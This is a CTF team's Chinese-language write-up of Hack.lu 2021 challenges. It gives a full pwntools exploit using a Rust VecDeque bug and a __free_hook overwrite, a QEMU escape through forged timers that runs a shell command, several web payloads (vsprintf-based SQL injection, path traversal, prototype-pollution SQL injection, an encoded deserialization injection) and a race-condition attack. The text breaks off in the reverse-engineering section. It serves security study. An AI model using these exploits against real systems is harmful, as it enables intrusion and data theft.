# Hack.lu CTF 2021 Writeup

## 前言

本次比赛我们获得了第五名的成绩

![](https://i.imgur.com/HDBtpK4.png)

现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：root@r3kapig.com

## Pwn

### UnsAFe(Mid)

可能写得有些啰嗦 但是算是完整记录了这个题目 师傅们凑合看看

#### 简述

这道题的考察点就是 [Rust CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36318) + 堆风水操控。其中 Rust 标准库中 `VecDeque` 的漏洞比较有意思，下面也会重点讲该漏洞的成因和利用方法

#### 功能

程序开头先初始化了几个变量，这些变量接下来也会用到。

下面是它们的类型（有调试信息可以直接找到）：

```rust
self.pws: HashMap<String, String, RandomState> 
highlighted_tast.q: Box<Vec<String>>;
task_queue.q:VecDeque<BoxVec<alloc::string::String>>>
```

分析结果:

0 功能是向 `PasswordManager` 的 hashmap 中添加一个 key-value

1 功能是通过输入 key，来在 hashmap 中查找 value

2 功能是修改键值对，但是如果 insert 时的 str 长度 > 需要替换的 str，则会插入，否则会替换

3 输入 task 数量，然后对每个 task 要输入 elem （String）数量，对每个 String 要输入长度和内容，最后 `push_back` 到 `TaskDeque` 中

4 功能是用 `pop_front` 从 3 中 `TaskQueue` 取一个 `Vec<String> q`，然后 `highlighted_task->q = q`

5 功能是修改 `highlighted_task` 中的 vec，给定需要修改的 idx 和新内容进行修改 ，会存在和 2 功能一样的问题

6 功能是通过输入 idx 获取 highlighted_task 中的 value

7 功能是向 highlighted_task 添加（push）一个 value

#### 漏洞：

找到了一个漏洞：[VecDeque: length 0 underflow and bogus values from pop_front(), triggered by a certain sequence of reserve(), push_back(), make_contiguous(), pop_front()](https://github.com/rust-lang/rust/issues/79808)，存在于 1.48.0 版本的 `VecDeque<T>::make_contiguous` 函数中。

查找字符串可以找到编译器的版本:

![](https://i.imgur.com/XZ2Hzgw.png)

在 `unsafe::TaskQueue::push_back::haa04777951b4543a` 函数中也调用了 `make_contiguous`

![](https://i.imgur.com/hVAK2Ro.png)

对上了！下面就来研究一下这个漏洞。

安装 rust 1.48 及其源码：

```bash
$ rustup install 1.48
$ rustup +1.48 component add rust-src
```

找到对应 patch：[fix soundness issue in `make_contiguous` #79814](https://github.com/rust-lang/rust/pull/79814/files)

#### VecDeque 的内部表示

结构体：

- .rustup/toolchains/1.48-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/alloc/src/collections/vec_deque.rs

```rust
    pub struct VecDeque<T> {
    	// tail and head are pointers into the buffer. Tail always points
    	// to the first element that could be read, Head always points
    	// to where data should be written.
    	// If tail == head the buffer is empty. The length of the ringbuffer
    	// is defined as the distance between the two.
    	tail: usize,
    	head: usize,
    	buf: RawVec<T>,
    }
```
这里借用 **[Analysis of CVE-2018-1000657: OOB write in Rust's VecDeque::reserve()](https://gts3.org/2019/cve-2018-1000657.html)** 中的图示：

![](https://gts3.org/blog/cve-2018-1000657.assets/ring-buffer.png)


poc:

https://github.com/rust-lang/rust/issues/79808#issuecomment-740188680

修改 `VecDeque<int>` 为 `VecDeque<String>`：

- poc.rs

```rust
  use std::collections::VecDeque;
  
  fn ab(dq: &mut VecDeque<String>, sz: usize) {
      for i in 0..sz {
          let string = (i).to_string();
          dq.push_back(string);
      }
      dq.make_contiguous();
      for _ in 0..sz {
          dq.pop_front();
      }
  }
  
  fn ab_1(dq: &mut VecDeque<String>, sz: usize) {
      for i in 0..sz {
          let string = (i).to_string();
          dq.push_back(string);
      }
      for _ in 0..sz {
          dq.pop_front();
      }
  }
  
  // let free = self.tail - self.head;
  // let tail_len = cap - self.tail;
  
  fn main() {
      let mut dq = VecDeque::new(); // 默认capacity为7
      ab_1(&mut dq, 2);
      ab(&mut dq, 7);
      
      dbg!(dq.len()); // this is zero
      
      dbg!(dq.pop_front()); // uaf+double frees
  }
```

编译并运行：

```bash
$ rustc poc.rs
$ ./poc 
[poc.rs:32] dq.len() = 0
[poc.rs:34] dq.pop_front() = Some(
    "@",
)
free(): double free detected in tcache 2
Aborted
```

发生了 double free

patch:

https://github.com/rust-lang/rust/issues/80293

漏洞的成因：

![](https://i.imgur.com/OBQ7DUU.png)

![](https://i.imgur.com/0EoJVuM.png)

#### VecDeque\<T>::make_contiguous

`make_contiguous` 的作用是使 `VecDeque` 的元素变得连续，这样就可以调用 `as_slice` 等方法获得 `VecDeque` 的切片。

接下来结合源码、POC 和 Patch 画图分析： 

首先创建 capacity 为 3 的 VecDeque：`let mut dq = VecDeque::with_capacity(3);`

![](https://i.imgur.com/RkvBud1.png)

然后 `dq.push_back(val);` 两次，`dq.pop_front();` 两次：

![](https://i.imgur.com/nrLSqs5.png)

然后再依次 `push_back` a、b、c：

![](https://i.imgur.com/oY4eaco.jpg)

此时调用 `dq.make_contiguous();`：

此时 `self.tail == 2, self.head == 1, free == 1, tail_len == , len == 3`

执行流程会走入 `else if free >= self.head`

- `make_contiguous`

```rust
  #[stable(feature = "deque_make_contiguous", since = "1.48.0")]
      pub fn make_contiguous(&mut self) -> &mut [T] {
          if self.is_contiguous() {
              let tail = self.tail;
              let head = self.head;
              return unsafe { &mut self.buffer_as_mut_slice()[tail..head] };
          }
  
          let buf = self.buf.ptr();
          let cap = self.cap();
          let len = self.len();
  
          let free = self.tail - self.head;
          let tail_len = cap - self.tail;
  
          if free >= tail_len {
              // there is enough free space to copy the tail in one go,
              // this means that we first shift the head backwards, and then
              // copy the tail to the correct position.
              //
              // from: DEFGH....ABC
              // to:   ABCDEFGH....
              unsafe {
                  ptr::copy(buf, buf.add(tail_len), self.head);
                  // ...DEFGH.ABC
                  ptr::copy_nonoverlapping(buf.add(self.tail), buf, tail_len);
                  // ABCDEFGH....
  
                  self.tail = 0;
                  self.head = len;
              }
          } else if free >= self.head {
              // there is enough free space to copy the head in one go,
              // this means that we first shift the tail forwards, and then
              // copy the head to the correct position.
              //
              // from: FGH....ABCDE
              // to:   ...ABCDEFGH.
              unsafe {
                  ptr::copy(buf.add(self.tail), buf.add(self.head), tail_len);
                  // FGHABCDE....
                  ptr::copy_nonoverlapping(buf, buf.add(self.head + tail_len), self.head);
                  // ...ABCDEFGH.
  
                  self.tail = self.head;
                  self.head = self.tail + len;
              }
          } else {
              // free is smaller than both head and tail,
              // this means we have to slowly "swap" the tail and the head.
              //
              // from: EFGHI...ABCD or HIJK.ABCDEFG
              // to:   ABCDEFGHI... or ABCDEFGHIJK.
              let mut left_edge: usize = 0;
              let mut right_edge: usize = self.tail;
              unsafe {
                  // The general problem looks like this
                  // GHIJKLM...ABCDEF - before any swaps
                  // ABCDEFM...GHIJKL - after 1 pass of swaps
                  // ABCDEFGHIJM...KL - swap until the left edge reaches the temp store
                  //                  - then restart the algorithm with a new (smaller) store
                  // Sometimes the temp store is reached when the right edge is at the end
                  // of the buffer - this means we've hit the right order with fewer swaps!
                  // E.g
                  // EF..ABCD
                  // ABCDEF.. - after four only swaps we've finished
                  while left_edge < len && right_edge != cap {
                      let mut right_offset = 0;
                      for i in left_edge..right_edge {
                          right_offset = (i - left_edge) % (cap - right_edge);
                          let src: isize = (right_edge + right_offset) as isize;
                          ptr::swap(buf.add(i), buf.offset(src));
                      }
                      let n_ops = right_edge - left_edge;
                      left_edge += n_ops;
                      right_edge += right_offset + 1;
                  }
  
                  self.tail = 0;
                  self.head = len;
              }
          }
  
          let tail = self.tail;
          let head = self.head;
          unsafe { &mut self.buffer_as_mut_slice()[tail..head] }
      }
```

结果：

![](https://i.imgur.com/9qQatkX.png)

`self.head` 直接 out of bound 了，而且还多出一个 c 元素的克隆。

再来看看 `pop_front` ：

- `pop_front` & `is_empty`

```rust
  pub fn pop_front(&mut self) -> Option<T> {
          if self.is_empty() {
              None
          } else {
              let tail = self.tail;
              self.tail = self.wrap_add(self.tail, 1);
              unsafe { Some(self.buffer_read(tail)) }
          }
      }
  // ...
  #[stable(feature = "rust1", since = "1.0.0")]
  impl<T> ExactSizeIterator for Iter<'_, T> {
      fn is_empty(&self) -> bool {
          self.head == self.tail
      }
  }
```

`self.head` 永远不会等于 `self.tail` 了。。。此时如果不断调用 `dq.pop_front();` ，就会产生下面的无限循环序列：

```js
a b c c a b c c ...
```

假如 `VecDeque` 的元素是分配在堆上的话，我们就有了 UAF/double free 的能力

#### 利用

搞清楚漏洞的成因后，接下来就是搞一些堆风水的 dirty work，控制 `highlighted_task`，得到任意地址读写的能力。

比赛期间我没有把一些原语搞清楚，很多都是连猜带懵慢慢调出来的，只求达到效果。

##### 泄漏堆地址

将 `PasswordManager` 中保存 value 的 chunk 申请到将被 double free 的 chunk 上，然后再次 free 它，使用 1 功能，就可以泄漏堆地址了。

泄漏了堆地址修改时就可以使 `highlighted_task` 的 ptr 指针指向堆上伪造的 `Vec<String>`，但先要考虑堆风水的问题。

##### 堆风水

在我们连续 `pop_front` 后，tcache free list 已经被填满了，fastbin free list 也有一些 chunk。如果想要 UAF highlighted task，我们就要找到申请较小 chunk 且不会立即释放的原语。

这里我选择 `TaskQueue` 的 `push_back` 方法来清空 tcache free list。 

还有一个原语是 `PasswordManager` 的 `insert` + `alter` 方法。调试发现 `alter` 会先申请替代的 `String`，再 drop 旧的 `String` 。但由于我对 Rust 标准库的 `HashMap` 实现不太熟悉，这个原语不是很可靠。。。

##### 控制 highlighed_task & 伪造 `Vec<String>`

清空 tcache free list 后，我们就通过 `PasswordManager` 的 `insert` + `alter` 方法申请到将被 UAF 的 highlighted_task，伪造其 ptr 指针和 cap、len。

其中 ptr 指针指向有两个 `Vec<String>` 的堆空间，这两个 `Vec<String>` 一个的 buf 指向存放着 libc 地址的堆空间，另一个指向 `__free_hook-0x8` 。

##### 泄漏 libc 地址

不断 insert_str 增加 String 长度（2 功能），String 在增长时会有大小大于 0x410 的 chunk 被 free 进 unsortedbin，这样堆上就有了 libc 地址。

借助伪造的 `Vec<String>`，我们就可以用 6 功能泄漏 libc 地址了。

##### 写 __free_hook

使用 5 功能同时写入 "/bin/sh" 和 system 地址

#### 环境搭建

因为该 Rust 程序依赖的动态链接库较多，patch 的程序堆风水和远程不一样，所以我选择在 Docker 中调试。

##### Dockerfile & docker-compose.yml

- Dockerfile

```docker
  # docker build -t unsafe . && docker run -p 4444:4444 --rm -it unsafe
    
   FROM ubuntu:21.04
  
   RUN apt update
   RUN apt install socat -y
   RUN useradd -d /home/ctf -m -p ctf -s /bin/bash ctf
   RUN echo "ctf:ctf" | chpasswd
  
   WORKDIR /home/ctf
  
   COPY flag .
   COPY unsafe .
  
   RUN chmod +x ./unsafe
   RUN chown root:root /home/ctf/unsafe
   RUN chown root:root /home/ctf/flag
  
   USER ctf
  
   CMD socat tcp-listen:4444,reuseaddr,fork exec:./unsafe,rawer,pty,echo=0
```

- docker-compose.yml

```yaml
  version: '2'                                                     
  services:
   hacklu_2021_unsafe:
     image: hacklu_2021:unsafe
     build: .    
     container_name: hacklu_2021_unsafe
     cap_add:                                         
        - SYS_PTRACE            
     security_opt:
        - seccomp:unconfined
     ports:
      - "13000:4444"
```

加入 —cap-add 选项，这样就能在 docker 中 attach 进程了

#### pwndbg with Rust

直接调试 pwndbg 会报错，无法查看堆的一些信息：

![](https://i.imgur.com/MEgu9qZ.png)

找到了对应的 issue：[no type named uint16 in rust #855](https://github.com/pwndbg/pwndbg/issues/855)

只要在 run 或者 attach 前执行一下 `set language c` 就好了


#### exp

写的有点乱 凑合看吧

```python
from pwn import *

libc = ELF("./libc-2.33.so")

class PasswordManager(object):
        def insert(self, name, context):
                io.send(p8(0))

                size1 = len(name)
                io.send(p8(size1))
                for i in range(size1):
                        ascii = ord(name[i])
                        io.send(p8(ascii))

                size2 = len(context)
                io.send(p8(size2))
                for i in range(size2):
                        ascii = ord(context[i])
                        io.send(p8(ascii))
                io.recvuntil(b"\x7f\x7f\x7f\x7f")

        def get(self, name):
                io.send(p8(1))

                size = len(name)
                io.send(p8(size))

                for i in range(size):
                        ascii = ord(name[i])
                        io.send(p8(ascii))
                password = io.recvuntil(b"\x7f\x7f\x7f\x7f", drop=True)
                print(b"password = " + password)
                return password

        def alter(self, name, new_context):
                io.send(p8(2))
                size = len(name)
                io.send(p8(size))
                for i in range(size):
                        ascii = ord(name[i])
                        io.send(p8(ascii))
                size2 = len(new_context)
                io.send(p8(size2))
                for i in range(size2):
                        ascii = ord(new_context[i])
                        io.send(p8(ascii))
                io.recvuntil(b"\x7f\x7f\x7f\x7f")

        def alter_bytes(self, name, new_context):
                io.send(p8(2))
                size = len(name)
                io.send(p8(size))
                for i in range(size):
                        ascii = ord(name[i])
                        io.send(p8(ascii))

                size2 = len(new_context)
                io.send(p8(size2))
                io.send(new_context)
                io.recvuntil(b"\x7f\x7f\x7f\x7f")

class HighlightedTask(object):
        def add(self, context):
            io.send(p8(7))

            size = len(context)
            io.send(p8(size))

            for i in range(size):
                ascii = ord(context[i])
                io.send(p8(ascii))
            io.recvuntil(b"\x7f\x7f\x7f\x7f")

        def show(self, idx):
                io.send(p8(6))

                io.send(p8(idx))

                content = io.recvuntil(b"\x7f\x7f\x7f\x7f", drop=True)
                print(b"content = " + content)
                return content

        def alter(self, idx, new_context):
                io.send(p8(5))
                io.send(p8(idx))
                size = len(new_context)
                io.send(p8(size))
                for i in range(size):
                        ascii = ord(new_context[i])
                        io.send(p8(ascii))
                io.recvuntil(b"\x7f\x7f\x7f\x7f")

        def alter_bytes(self, idx, new_context):
                io.send(p8(5))
                io.send(p8(idx))
                size = len(new_context)
                io.send(p8(size))
                io.send(new_context)

        def pop_set(self):
                io.send(p8(4))
                io.recvuntil(b"\x7f\x7f\x7f\x7f")

        def push_back(self, task_list):
                io.send(p8(3))

                task_num = len(task_list)
                io.send(p8(task_num))

                for t in range(task_num):
                        self.one_task(task_list[t])
                io.recvuntil(b"\x7f\x7f\x7f\x7f")

        def one_task(self, context_list):
            vec_num = len(context_list)

            io.send(p8(vec_num))

            for i in range(vec_num):
                size = len(context_list[i])
                io.send(p8(size))

                for j in range(size):
                    ascii = ord(context_list[i][j])
                    io.send(p8(ascii))

#io = process("./unsafe")
io = remote("flu.xxx", 20025)

ht = HighlightedTask()
task_list = []
context_list1 = ['y' * 0x28, 'z' * 0x28]
for i in range(2):
    task_list.append(context_list1)
ht.push_back(task_list)
for i in range(2):
    ht.pop_set()
for i in range(4):
    task_list.append(context_list1)
context_list1 = ['j' * 0x58, 'k' * 0x58]
task_list.append(context_list1)
ht.push_back(task_list)
for i in range(6):
    ht.pop_set()
ht.pop_set()

pm = PasswordManager()
context_list2 = ['s' * 0x28, 't' * 0x28]
task_list = []
for i in range(7):
    task_list.append(context_list2)
ht.push_back(task_list) # 把tcache free list 中的chunk全部申请完

ht.pop_set() # 返回和上一次pop相同的highlighted_task
pm.insert('1' * 8, 'j' * 8)
pm.alter('1' * 8, '\x00' * 0x11) # 这个value将被free，然后就可以泄漏堆地址了
ht.pop_set()
heap_addr = u64(pm.get('1' * 8)[8:16].ljust(8, b'\x00')) - 0x10
print("heap_addr = " + hex(heap_addr))

for i in range(10):
    ht.pop_set()

# 第二次利用VecDeque::make_contiguous中的漏洞
task_list = []
context_list1 = ['g' * 0x28, 'h' * 0x28]
for i in range(2):
    task_list.append(context_list1)
print(task_list)
ht.push_back(task_list)
for i in range(2):
    ht.pop_set()
for i in range(4):
    task_list.append(context_list1)
context_list1 = ['n' * 0x58, 'o' * 0x58]
task_list.append(context_list1)
ht.push_back(task_list)
for i in range(6):
    ht.pop_set()
ht.pop_set()

context_list2 = ['a' * 0x28, 'i' * 0x28]
task_list = []
for i in range(20):
    task_list.append(context_list2)
ht.push_back(task_list) # 把tcache free list 中的chunk全部申请完

ht.pop_set()
pm.insert('2' * 1, 'j' * 2)
#0x5070 0x5bc0 0x5ac0
pm.alter_bytes('2' * 1, (p64(heap_addr + 0x59b0) + p64(0x2000) + p64(0x2000)).ljust(0x18, b'v'))
pm.insert('3' * 1, 'j' * 0xff)
for i in range(8):
    pm.alter_bytes('3' * 1,  (p64(heap_addr + 0x5070) + p64(0x18) + p64(0x18)).ljust(0xfe, b'v'))
libc.address = u64(ht.show(0)[16:]) - 0x1e0c00
print("libc.address = " + hex(libc.address))

pm.alter_bytes('3' * 1,  (p64(0xdeadbeef) * 2 + p64(libc.symbols["__free_hook"] - 0x8) + p64(0x30) + p64(0x50)).ljust(0xfe, b'v'))
ht.alter_bytes(0xc, b"/bin/sh\x00" + p64(libc.symbols["system"]))

io.interactive()
```

### Stonks Socket(high)

https://mem2019.github.io/jekyll/update/2021/10/31/HackLu2021-Stonks-Socket.html

### Cloudinspect(Mid)

比较简单的QEMU题目，还给了源码，对新手极其友好
先贴个交互脚本，作用是连接远程，然后输入可执行文件

```python
from pwn import *
import os

local=0
aslr=True
context.log_level="debug"
#context.terminal = ["deepin-terminal","-x","sh","-c"]

if local==1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process("./run_chall.sh",aslr=aslr)
    #gdb.attach(p)
else:
    remote_addr=['flu.xxx', 20065]
    p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s):
    print('\033[1;31;40m{s}\033[0m'.format(s=s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

if __name__ == '__main__':
    if not local:
        ru("size:")
    os.system("musl-gcc ./exp/exp.c --static -o ./exp/exp")
    poc = open("./exp/exp", "rb").read()
    size = len(poc)
    sl(str(size))
    ru(b"Now send the file\n")
    sn(poc)
    p.interactive()
```

主要功能就是这几个

```c
void SetDMACMD(size_t val) {
  pcimem_write(0x78, 'q', val, 0);
}

void SetDMASRC(size_t val) {
  pcimem_write(0x80, 'q', val, 0);
}

void SetDMADST(size_t val) {
  pcimem_write(0x88, 'q', val, 0);
}

void SetDMACNT(size_t val) {
  pcimem_write(0x90, 'q', val, 0);
}

size_t TriggerDMAWrite() {
  size_t val = 0;
  pcimem_write(0x98, 'q', val, 0);
  return val;
}

size_t GetDMACMD() {
  size_t val = 0;
  pcimem_read(0x78, 'q', &val, 0);
  return val;
}

size_t GetDMASRC() {
  size_t val = 0;
  pcimem_read(0x80, 'q', &val, 0);
  return val;
}

size_t GetDMADST() {
  size_t val = 0;
  pcimem_read(0x88, 'q', &val, 0);
  return val;
}

size_t GetDMACNT() {
  size_t val = 0;
  pcimem_read(0x90, 'q', &val, 0);
  return val;
}
```

漏洞在这，没有对dma的offset进行检查，从而可以基于dma_buf进行上下越界读写，注意由于dma_buf不大，从而这个硬件的state结构体是在堆地址上的，如果是mmap的其实还有骚操作，这里就不说了

![](https://i.imgur.com/izyXlV5.png)

这里注意下，这里的as是address_space_memory，因此dma可以直接对用户态分配的内存进行，如果是pci的地址空间，则需要写内核驱动交互

![](https://i.imgur.com/cJu9I8S.png)

利用方法很简单，先泄露硬件state的地址和qemu的基地址。泄露state的方法是state结构体前内嵌的pci state结构体里有指向硬件state的指针，bingo

```c
  SetDMACMD(1);
  SetDMASRC(-0xa08);
  SetDMADST(buffer_phyaddr);
  SetDMACNT(0x1000);
  TriggerDMARead();

  size_t DMA_BUF_ADDR = buffer[0xc0 / 8] + 0xa08;
  size_t code_base = buffer[0x2c8 / 8] - 0xd6af00;
```

然后就是通过伪造main_loop_tlg内的time_list_group内的timer_list内的active_timer的方法，这个方法自多年前强网杯提出来就一直是通用方法了，具体可以看看exp怎么搞的，注意伪造的时候不能破坏qemu_clocks、lock的active等基本检查

```c
  char *payload = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  char cmd[] = "cat flag\x00";
  memcpy((void *)(payload + 0x8 + 0x100 + sizeof(struct QEMUTimerList ) + sizeof(struct QEMUTimer )),  \
                (void *)cmd,
                sizeof(cmd));

  size_t main_loop_tlg_addr = 0xe93e40 + code_base;
  size_t qemu_timer_notify_cb_addr = code_base + 0x540E50;

  *(size_t*)payload = main_loop_tlg_addr + 0x20 + 0x100;

  struct QEMUTimerList *tl = (struct QEMUTimerList *)(payload + 0x8 + 0x100);
  struct QEMUTimer *ts = (struct QEMUTimer *)(payload + 0x8 + 0x100 + sizeof(struct QEMUTimerList));

  void *fake_timer_list =(void *)(main_loop_tlg_addr + 0x20 + 0x100);
  void *fake_timer = (void *)((size_t)fake_timer_list + sizeof(struct QEMUTimerList));

  void *system_plt = code_base + 0x2B3D60;
  void *cmd_addr = fake_timer + sizeof(struct QEMUTimer);

  *(size_t *)(payload + 8 + 3 * 0x10 + 0) = (size_t)fake_timer_list;
  *(char *)(payload + 8 + 3 * 0x10 + 0xc) = 1;

  /* Fake Timer List */
  printf("fake timer list\n");
  tl->clock = (void *)(main_loop_tlg_addr + 0x20 + 3 * 0x10);
  *(size_t *)&tl->active_timers_lock[0x28] = 1;
  tl->active_timers = fake_timer;
  tl->le_next = 0x0;
  tl->le_prev = 0x0;
  tl->notify_cb = (void *)qemu_timer_notify_cb_addr;
  tl->notify_opaque = 0x0;
  tl->timers_done_ev = 0x0000000100000000;

  /*Fake Timer structure*/
  ts->timer_list = fake_timer_list;
  ts->cb = system_plt;
  ts->opaque = cmd_addr;
  ts->scale = 1000000;
  ts->expire_time = -1;
```

接着就是通过越界写去篡改main_loop_tlg，为了方便减少误差，注意两点。一个是直接使用qemu的plt表内的函数，不要去泄露libc，那样就画蛇添足了；另一个是伪造tlg的时候尽量一次写完，但是要对qemu_clocks进行伪造，可以在实际利用时提高稳定性

```
  SetDMACMD(1);
  SetDMADST(main_loop_tlg_addr - DMA_BUF_ADDR + 0x18);
  SetDMASRC(virt2phys(payload));
  SetDMACNT(0x200);
  TriggerDMAWrite();
```

提一下，用musl-gcc可以在静态编译时极大地减小exp大小

### secure-prototype(low)

这道题目没有开启PIE，意味着我们可以随意去预测任意地址。
根据分析发现，这道题目除了39321的DEBUG功能外，还有1056这一个功能。

![](https://i.imgur.com/flsOdhh.png)

这个功能编辑了off_22050的函数指针

![](https://i.imgur.com/s0gM4w0.png)

而这个函数指针在4919功能中被调用。
因此，我们可以通过传入参数更改该函数指针，随后可以达到任意执行函数的效果。
此处改为plt表中的scanf函数

![](https://i.imgur.com/5FNhswz.png)


随后即可改写任意内存。
而在功能48中，程序打开了filename字符串所指向的文件，因此我们可以改写filename字符串达到任意读文件的目的。

![](https://i.imgur.com/goYrVD8.png)

接下来要解决的是scanf的参数，参数2已经有了（filename字符串所在的地址），参数1可以查找%s字符串位置，在这里：

![](https://i.imgur.com/IkzTyAg.png)

大致思路有了，接下来构造exp:
发送 1056 66928 0 0 改写函数指针到scanf函数
发送 4919 70140 139352 0 调用scanf函数，其中两个参数分别为%s和filename的地址
发送 flag.txt 改写filename为flag.txt
发送 48 0 0 0 执行读文件操作，即可读到flag.txt文件

## Web

### trading-api(High)

GET token：

```json
{
    "username":"../../../../health?rdd/.",
    "password":"aaaa"
}
```

拿到token能访问的接口：http://flu.xxx:20035/api/transactions/1  （但是没数据可以读）
写下思路：
1. if (regex.test(req.url) && !hasPermission(userPermissions, username, permission)) { 
这里是and ，所以满足regex.test(req.url) = 0也是可以绕过校验，访问api/priv/assets
满足hasPermission需要构造出username为warrenbuffett69的jwt
2. 在api/priv/assets里注入or二次注入

路由的c解析库可能有问题，碰到#会把\变成/，但是req.url还是/api\priv/，可以绕过正则

![](https://i.imgur.com/BTY6cER.png)

![](https://i.imgur.com/GDYzVUh.png)

这里不难看出可以原型链污染，但是要配合最后的注入，把我们的payload注入进去

![](https://i.imgur.com/RQaYqOF.png)

这里escapedParams的遍历key可以把我们上一步构造的原型链污染的key获取到

![](https://i.imgur.com/P2qatc5.png)

这里的
username  = "../../::txId/../health?/."的构造，其实是利用replaceall，先把:txId替换成199152684014119，然后利用原型链注入进去的199152684014119这个key，将:199152684014119替换成我们的恶意sql

最后的query就是

```sql
INSERT INTO transactions (id, asset, amount, username) VALUES (95187879456802, '__proto__', -1, '../../'||(select flag from flag)||'/../health?/.')
```

最后附上简单的解题过程：

![](https://i.imgur.com/0xUbtWw.png)

![](https://i.imgur.com/DPiFdOy.png)

![](https://i.imgur.com/3dynoYq.png)

### Diamond Safe(Mid)

题目附件下下来

先看login.php中的代码

```php
$query = db::prepare("SELECT * FROM `users` where password=sha1(%s)", $_POST['password']);
if (isset($_POST['name'])){
    $query = db::prepare($query . " and name=%s", $_POST['name']);
}
else{
    $query = $query . " and name='default'";
}
    $query = $query . " limit 1";
    $result = db::commit($query);
```

其中prepare处的代码[DB.class.php]：

```php
public static function prepare($query, $args){
        if (is_null($query)){
            return;
        }
        if (strpos($query, '%') === false){
            error('%s not included in query!');
            return;
        }
        // get args
        $args = func_get_args();
        array_shift( $args );
        $args_is_array = false;
        if (is_array($args[0]) && count($args) == 1 ) {
            $args = $args[0];
            $args_is_array = true;
        }
        $count_format = substr_count($query, '%s');
        if($count_format !== count($args)){
            error('Wrong number of arguments!');
            return;
        }
        // escape
        foreach ($args as &$value){
            $value = static::$db->real_escape_string($value);
        }
        // prepare
        $query = str_replace("%s", "'%s'", $query);
        $query = vsprintf($query, $args);
        return $query;
    }
```

prepare中用到了`$query = vsprintf($query, $args)`; 
这里的漏洞点是：

![](https://i.imgur.com/vwFnmal.png)


我们可以通过一下payload进行闭合：

```
password=password%1$&name=)+or+1=1%23name
```

把name的值通过%1带到password中，绕过过滤，闭合sha1()，然后用or进行永真闭合

![](https://i.imgur.com/dO7bpzi.png)

登陆进去之后

![](https://i.imgur.com/70RvcaN.png)


可以看到有下文件的点，不过有个校验：check_url和gen_secure_url，大致意思是把要下的文件加上secret的md5值和传入的md5值比较，但是这里获取参数用的是`$_SERVER['QUERY_STRING']`，获取到的是未urldecode的字符串，所以这里可以直接利用QUERY_STRING不自动urldecode的特性和php中空格等于_的特性一把梭

构造链接：

```
https://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013&file_name=FlagNotHere.txt&file%20name=../../../../../flag.txt
```

Getflag

![](https://i.imgur.com/FwzhGUT.png)

### NodeNB(low)

创建用户是分两步：

```js
await db.set(`user:${name}`, uid);
await db.hmset(`uid:${uid}`, { name, hash });
```

删除用户的时候是：

```js
await db.set(`user:${user.name}`, -1);
await db.del(`uid:${uid}`);
```

Del uid的时候 `{ name, hash }` 应该是被删掉了的，但是此时用户名对应的uid被设为了 -1
结合访问note时候的判断：

```js
if (!await db.hexists(`uid:${uid}`, 'hash')) {
            // system user has no password
            return true;
        }
```

`Del session`是在`del uid之`后的，就是说`del uid`之后， session还有一段有效的时间，这个时候竞争着去请求/note/flag，就该就能进入`if (!await db.hexists(uid:${uid}, 'hash'))`，返回 true 了吧
 条件竞争题
 
用burp intruder 一直请求 /notes/flag，然后再去删用户

![](https://i.imgur.com/pn36u8e.png)

### SeekingExploits(High)

(当时没出来 赛后做出来了 记录一下)

emarket-api.php有序列化函数，并且插入exploit_proposals表

![](https://i.imgur.com/KTQJ5cS.png)

另外一个emarket.php文件从数据库中获取数据，并且反序列化，进入simple_select函数中，而这一步没有对sql做任何的过滤，exploit_proposals表中的内容是可以随便插入的，所以这里思路就是二次注入

![](https://i.imgur.com/JCaivKa.png)

emarket.php是在插件目录下，所以找一个地方可以hook去插件的地方，执行这块儿代码

![](https://i.imgur.com/WDTv7lv.png)


这里可以可以hook进去执行emarket.php的list_proposals方法，然后反序列化。这里要执行到run_hooks的前提是要先发过邮件

![](https://i.imgur.com/qvTV8fw.png)

![](https://i.imgur.com/TJz2L4R.png)

这里如果pmid从数据库中找不到就会报错。

但是这里因为有my_serialize/unserialize方法，不能对object进行操作，所以这里的trick就是利用在
escape_string中的validate_utf8_string方法，可以把%c0%c2变成?，这样就逃逸出来了

Poc:

```js
/emarket-api.php?action=make_proposal&description=1&software=1.2&latest_version=4&additional_info[a]=%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2&additional_info[b]=%22%3b%73%3a%37%3a%22%73%6f%6c%64%5f%74%6f%22%3b%73%3a%35%35%3a%22%30%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%75%73%65%72%6e%6f%74%65%73%29%20%20%66%72%6f%6d%20%6d%79%62%62%5f%75%73%65%72%73
```

![](https://i.imgur.com/rKRQmsR.png)

![](https://i.imgur.com/Axy7q3y.png)

![](https://i.imgur.com/UY8eGmy.png)

打完poc后，直接点击查看就行了

![](https://i.imgur.com/F3CgiOJ.png)

![](https://i.imgur.com/oTe5fJt.png)

## Reverse

### atareee(low)

![](https://i.imgur.com/se63odf.png)

导入Ghidra分析
经过调试可得到，0x50C2地址为我们的输入数据，在xorenc函数中进行加密操作，逻辑如下

![](https://i.imgur.com/x8uVt6e.png)

接下来是验证函数，0x509A为输出到屏幕的部分，图中标注的0x5276和0x524e分别为错误、正确字符串的位置

![](https://i.imgur.com/OupPPJG.png)


接下来使用Python复现逻辑并进行爆破

```python
target = [
    0x14,  0x1E,   0xC,  0xE0,
    0x30,  0x5C,  0xCE,  0xF0,
    0x36,  0xAE,  0xFC,  0x39,
    0x1A,  0x91,  0xCE,  0xB4,
    0xC4,   0xE,  0x18,  0xF3,
    0xC8,  0x8E,   0xA,  0x85,
    0xF6, 0xbd
]

array_50c2 = [
    0xD9,  0x50,  0x48,  0xB9,
